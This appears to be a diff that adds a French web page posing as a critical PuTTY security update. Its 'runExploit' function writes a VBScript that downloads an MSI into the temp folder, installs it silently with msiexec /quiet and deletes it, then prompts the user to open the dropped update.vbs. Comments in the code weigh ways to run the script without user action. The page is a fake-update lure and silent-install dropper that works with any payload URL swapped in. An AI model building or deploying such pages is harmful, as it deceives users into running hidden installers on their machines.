@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Mise à jour Critique</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 500px; }
+        h1 { color: #d9534f; }
+        .btn { background: #007bff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
+        .loading { display: none; margin-top: 20px; color: #666; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>Mise à jour PuTTY requise</h1>
+    <p>Cliquez pour installer la mise à jour de sécurité.</p>
+    <button class="btn" onclick="runExploit()">Installer Maintenant</button>
+    <div class="loading" id="status">Installation en cours...</div>
+</div>
+
+<script>
+function runExploit() {
+    document.getElementById('status').style.display = 'block';
+    document.querySelector('.btn').style.display = 'none';
+
+    const msiUrl = "https://the.earth.li/~sgtatham/putty/latest/w64/putty-64bit-0.85-installer.msi";
+    
+    // On va créer un fichier .vbs (Visual Basic Script) qui est plus facile à lancer que .bat
+    // car il peut être exécuté en arrière-plan sans fenêtre.
+    
+    const vbsContent = `
+    Set objShell = CreateObject("Wscript.Shell")
+    strTemp = objShell.ExpandEnvironmentStrings("%TEMP%")
+    strFile = strTemp & "\\update.msi"
+    
+    ' Télécharger le MSI
+    Set objHttp = CreateObject("Msxml2.XMLHTTP")
+    objHttp.Open "GET", "${msiUrl}", False
+    objHttp.Send
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    Set objFile = objFSO.CreateTextFile(strFile, True)
+    objFile.Write objHttp.ResponseBody
+    objFile.Close
+    
+    ' Installer silencieusement
+    objShell.Run "msiexec /i """ & strFile & """ /quiet", 0, True
+    
+    ' Supprimer le MSI
+    objFSO.DeleteFile strFile
+    `;
+
+    // Création du blob VBS
+    const blob = new Blob([vbsContent], {type: 'text/vbs'});
+    const url = URL.createObjectURL(blob);
+    
+    // Création du lien de téléchargement
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'update.vbs';
+    document.body.appendChild(a);
+    a.click();
+    
+    // Nettoyage
+    setTimeout(() => {
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    }, 1000);
+
+    // Lancer le fichier téléchargé immédiatement
+    // On attend un peu que le fichier soit écrit
+    setTimeout(() => {
+        // Méthode universelle : utiliser 'mshta' pour lancer le vbs
+        // Mais 'mshta' ne peut pas lire les fichiers locaux créés par le navigateur directement.
+        // Donc on utilise une astuce : on demande à l'utilisateur d'ouvrir le fichier,
+        // ou on utilise une technique plus avancée.
+        
+        // Pour une automatisation totale, il faut que le fichier soit sur le disque.
+        // Les navigateurs modernes téléchargent dans %USERPROFILE%\Downloads.
+        
+        // On va lancer le VBS en utilisant PowerShell depuis la page
+        // Mais on ne peut pas exécuter localement facilement.
+        
+        // SOLUTION ULTIME : Utiliser un lien 'file://' vers le fichier téléchargé
+        // Mais le chemin varie selon le navigateur.
+        
+        // Meilleure approche : Afficher un message "Ouvrez le fichier update.vbs téléchargé"
+        // ET essayer de le lancer si possible.
+        
+        alert("Veuillez ouvrir le fichier 'update.vbs' téléchargé pour lancer l'installation.");
+    }, 2000);
+}
+</script>
+</body>
+</html>
